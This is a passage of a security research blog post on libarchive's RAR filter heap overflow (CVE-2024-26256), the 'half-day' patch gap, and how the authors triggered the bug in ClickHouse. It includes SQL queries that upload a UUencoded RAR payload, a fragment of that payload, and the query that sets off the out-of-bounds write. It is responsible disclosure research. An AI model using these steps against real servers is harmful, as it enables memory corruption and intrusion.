&lt;span class=&quot;nf&quot;&gt;execute_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_virtual_machine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1D0E06077D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x35AD576887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x393CD7E57E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x951C2C5DC8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_rgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD8BC85E701&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_audio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;archive_set_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARCHIVE_ERRNO_FILE_FORMAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No support for RAR VM program filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After RAR v5, filters became an enum type in the file format, making it possible to use only pre-defined filters. This can be observed in the &lt;a href=&quot;https://www.rarlab.com/rar_add.htm&quot;&gt;UnRAR source&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FilterType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// These values must not be changed, because we use them directly&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// in RAR5 compression and decompression code.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_DELTA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8E9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ARM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;FILTER_AUDIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_RGB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ITANIUM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  
  &lt;span class=&quot;c1&quot;&gt;// These values can be changed.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_LONGRANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_EXHAUSTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_NONE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;code-review&quot;&gt;Code Review&lt;/h4&gt;

&lt;p&gt;The concept of filters is interesting, and the vulnerabilities that Microsoft found are also related to the filter. So, we conducted a code review of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some time, we discovered a heap buffer overflow vulnerability in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; parameter of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; is used directly in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; without any checks, while the buffer size is only 0x40004 bytes:
&lt;img src=&quot;/assets/img/blog/20250212/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the places where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; is called, it can be observed that the function is used to copy data into the VM memory:
&lt;img src=&quot;/assets/img/blog/20250212/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability itself is straightforward, but constructing a valid filter and data is a bit more complex. These elements are not immediately presented in the RAR file format, they are actually part of the data. Additionally, the data is encoded using Huffman coding, and it isn’t consumed byte by byte, but rather 7 bits at a time. Since this is not the focus of this article, we won’t delve into the details here, but we encourage readers to attempt reproducing the vulnerability.
&lt;img src=&quot;/assets/img/blog/20250212/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability is &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256&quot;&gt;CVE-2024-26256&lt;/a&gt;. The reason it was not detected by fuzzing is straightforward: the data must be exactly the same size as the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt;. However, fuzzers often trim files when their coverage is similar.&lt;/p&gt;

&lt;h3 id=&quot;half-day-a-1-day-that-looks-like-a-0-day&quot;&gt;Half-Day: A 1-Day That Looks Like a 0-Day&lt;/h3&gt;

&lt;p&gt;When we mentioned earlier the two vulnerabilities the Microsoft Offensive Research Security Engineering (MORSE) team reported, we said that constructing a PoC is a little complex. Perhaps someone immediately thought, “Why not check the GitHub repository of libarchive for test cases or commit messages?” Well, we did look—there was nothing.&lt;/p&gt;

&lt;p&gt;Because, at that time, libarchive hadn’t even been patched yet, or perhaps no one even knew the vulnerabilities existed! We can see that Microsoft had already fixed the libarchive fork used in Windows back in January:
&lt;img src=&quot;/assets/img/blog/20250212/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the corresponding two patches for libarchive were merged in May and April, respectively:
&lt;img src=&quot;/assets/img/blog/20250212/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wouldn’t it mean that anyone who has been closely following Windows patches would immediately discover that there were two unpatched vulnerabilities in the libarchive upstream? These vulnerabilities would be considered 1-day for the Windows forked version of libarchive, because they have been discovered and patched. However, for libarchive upstream, they are 0-day, as no patch has been made, and the maintainers may even be unaware of the issue! We will refer to this situation as “0.5-day” or “Half-day” in the rest of the article.&lt;/p&gt;

&lt;p&gt;So, we began searching for large projects that use libarchive. We wanted to simulate a “Half-day attack” scenario and also believed that vendors incorporating libarchive in their software would be more willing to help us urge libarchive to patch the vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;attacking-clickhouse&quot;&gt;Attacking ClickHouse&lt;/h3&gt;

&lt;p&gt;After some investigation, we discovered that ClickHouse uses libarchive for decompression, which likely contains the vulnerable code. In ClickHouse, we can interact with the data inside the archive through the file table engine:
&lt;img src=&quot;/assets/img/blog/20250212/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the manual also mentions that ClickHouse only supports zip, tar, and 7z file formats:
&lt;img src=&quot;/assets/img/blog/20250212/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But is that really the case? Aside from zip, both tar and 7z in ClickHouse are implemented by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TarArchiveReader&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SevenZipArchiveReader&lt;/code&gt;, both of which inherit from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt;. The behavior of opening files with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt; is implemented in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; function. In the &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150&quot;&gt;source code&lt;/a&gt;, you can see the familiar pattern:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path_to_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_read_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_filter_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_format_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, ClickHouse also uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; to initialize the libarchive, which means we can trigger the vulnerabilities relative to RAR! All we need to do next is have ClickHouse decompress the files for us. Although the current decompression feature allows direct access to files on S3, &lt;strong&gt;it could not be used this way at the time&lt;/strong&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, we must upload the file first. The following query will create a new table, which will be stored as a file:&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Native&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even so, the file generated this way would include the table’s metadata. With the metadata present, we cannot make libarchive treat it as a RAR file, thus preventing the vulnerability from being triggered:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
00000010: 6707 7061 796c 6f61 64                   g.payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We needed to look for formats in ClickHouse’s Output Data Formats that dont’ have metadata at the beginning of the file. We decided to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; because in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Data is stored row by row.&lt;/li&gt;
  &lt;li&gt;Data within a row is separated by tabs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For example, if using the following two queries:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row1 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row2 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The content of the generated file would be:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;row1 string
row2 string
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nonetheless, there is a constraint: the data cannot contain tabs or newlines.
If we can overcome this, we can construct a valid RAR file! So, how can we avoid using tabs or newlines? It sounds complicated, but don’t forget that ClickHouse calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; to enable all filters for us! The one that fits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; the most is UUencode. Data that has been UUencoded would look like this:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;begin 600 exploit.rar.uu
M4F%R(1H&apos;`,^0&amp;lt;P``#0````````!287(A&amp;amp;@&amp;lt;`SY!S```-`````````%VI=(&quot;0
M,0&quot;VXP0`4,\+``(2&apos;^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;amp;QL`/#&amp;lt;ZFP8
M(AE0S(EB&apos;!(&quot;,EM(4I0M-&quot;H*&quot;T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
M&quot;*`T&apos;I;&amp;amp;]1&amp;gt;J]&amp;gt;HZ!&amp;gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
MH47O?/GG[Y^6LSGO/&amp;gt;&amp;gt;Z&amp;gt;&amp;gt;\]YJS!N3_(^_P3SS&quot;O\S`P+6&amp;lt;_V&apos;P(,#`P,#`B
M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&amp;lt;+9(IB&amp;lt;?NX``Y[L`3`P,#``,`&apos;/YCL*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, all we need to do next is UUEncode the original RAR payload and then upload it:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uu_encoded_rar_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ask ClickHouse to decompress it for us:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM file(&apos;poc.7z :: **&apos;, RawBLOB)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That would successfully trigger the out-of-bounds write vulnerability:
&lt;img src=&quot;/assets/img/blog/20250212/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We reported those issues to the Bug Bounty program of ClickHouse on Bugcrowd:
&lt;img src=&quot;/assets/img/blog/20250212/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ClickHouse quickly &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f&quot;&gt;fixed&lt;/a&gt; the issue and was willing to help us urge libarchive to patch the vulnerabilities! While it’s unclear whether Microsoft informed the libarchive maintainers about the CVE-2024-20696 and CVE-2024-20697 vulnerabilities (since there’s no public information, and the &lt;a href=&quot;https://github.com/libarchive/libarchive/security/advisories?state=draft&quot;&gt;Security Advisories&lt;/a&gt; on libarchive’s GitHub repository have no relevant details), as we mentioned earlier, these two vulnerabilities, initially discovered by Microsoft in the forked version of libarchive, were eventually patched in libarchive in May and April, ending the awkward “Half-day”  situation.&lt;/p&gt;

&lt;h3 id=&quot;issue-tracking&quot;&gt;Issue Tracking&lt;/h3&gt;

&lt;p&gt;In addition to reporting the two “Half-day” vulnerabilities mentioned earlier, don’t forget that we also reported three other 0-day vulnerabilities, each of which is as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;RCE fixed by Microsoft: CVE-2024-26256
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 4/27&lt;/li&gt;
      &lt;li&gt;Fixed on 8/14&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
